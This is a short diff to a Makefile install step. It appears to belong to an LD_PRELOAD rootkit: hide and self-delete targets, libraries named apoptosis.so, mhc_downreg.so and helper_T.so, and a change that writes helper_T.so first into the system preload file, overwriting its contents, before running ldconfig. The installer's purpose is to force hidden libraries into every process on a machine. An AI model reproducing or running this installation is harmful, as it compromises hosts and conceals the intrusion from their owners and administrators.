@@ -68,9 +68,9 @@ install: $(HIDE_TARGET) $(SELFDELETE_TARGET) $(BIN_TARGET) $(HELPER_T_TARGET) se
 	cp $(BIN_TARGET) $(LIBDIR)/
 	cp $(HELPER_T_TARGET) $(LIBDIR)/
 	@echo "Adding to $(PRELOAD_FILE)..."
+	echo "$(LIBDIR)/helper_T.so" > $(PRELOAD_FILE)
 	echo "$(LIBDIR)/apoptosis.so" >> $(PRELOAD_FILE)
 	echo "$(LIBDIR)/mhc_downreg.so" >> $(PRELOAD_FILE)
-	echo "$(LIBDIR)/helper_T.so" >> $(PRELOAD_FILE)
 	ldconfig
 	@echo "Installation complete!"
 	@echo ""
